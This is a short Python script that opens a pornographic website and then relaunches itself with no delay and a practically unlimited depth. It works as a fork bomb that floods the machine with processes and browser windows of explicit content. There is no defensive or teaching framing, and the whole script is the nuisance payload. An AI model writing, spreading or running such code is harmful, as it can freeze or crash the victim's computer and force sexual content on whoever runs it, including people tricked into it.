import webbrowser
import time
import subprocess
import sys

MAX_WINDOWS = 999999999999999999999999

def run(level=1):
    webbrowser.open("https://de.pornhub.org")

    if level < MAX_WINDOWS:
        time.sleep(0)
        subprocess.Popen([
            sys.executable,
            __file__,
            str(level + 1)
        ])

if __name__ == "__main__":
    level = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    run(level)
